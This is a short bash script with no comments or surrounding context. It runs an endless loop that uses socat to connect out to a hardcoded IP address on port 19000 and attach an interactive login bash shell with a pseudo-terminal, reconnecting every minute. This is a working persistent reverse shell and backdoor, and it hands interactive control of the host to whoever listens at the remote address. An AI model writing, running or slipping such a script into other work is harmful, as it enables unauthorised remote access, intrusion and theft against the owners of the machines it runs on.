#!/usr/bin/env bash

IP=139.180.141.47
socat_port=19000

while true; do
    echo "starting socat $socat_port"
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$socat_port
    sleep 1m
done